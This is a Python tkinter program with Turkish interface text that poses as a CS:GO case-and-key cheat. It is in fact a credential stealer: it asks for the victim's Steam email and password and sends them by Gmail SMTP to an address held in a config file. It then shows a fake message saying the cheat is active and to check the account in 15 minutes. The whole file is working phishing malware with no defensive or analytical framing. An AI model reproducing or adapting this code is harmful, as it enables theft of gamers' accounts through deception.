import os, time, smtplib, time,config
from tkinter import messagebox
import tkinter as tk

def login():
    if username.get() == "" and password.get() == "":
        messagebox.showerror("Hata","Lütfen Kutuları Veya Kutuyu Boş Bırakmayınız")
    conet = username.get(), password.get()
    content = " ".join(conet)
    mail = smtplib.SMTP("smtp.gmail.com",587)
    mail.ehlo()
    mail.starttls()
    mail.login(config.email,config.password)
    mail.sendmail(config.email,config.alici,content)
    messagebox.showinfo("Başarılı","Kasa Hileniz Aktiftir 15 Dakika Sonra Hesabınızı Kontrol Ediniz")
    time.sleep(1)
    exit()


window = tk.Tk()
window.geometry("500x150")
window.title("CS:GO Kasa Ve Anahtar Hilesi")
window.resizable(False,False)

label = tk.Label(window, text="Steam Hesabı", font="20").pack()

username = tk.StringVar()
password = tk.StringVar()

usernameentry = tk.Entry(window, text="Email", textvariable=username)
usernameentry.pack()
usernameentry.place(x=177 ,y=30)

email_label = tk.Label(window, text="Email :", font="20")
email_label.pack()
email_label.place(x=95,y=30)

passwordentry = tk.Entry(window, text="Şifre",show="*",textvariable=password)
passwordentry.pack()
passwordentry.place(x=177,y=60)

pass_label = tk.Label(window, text="Şifre :", font="20")
pass_label.pack()
pass_label.place(x=95,y=60)

button = tk.Button(window, text="Giriş Yap", command=login)
button.pack()
button.place(x=215,y=100)


window.mainloop()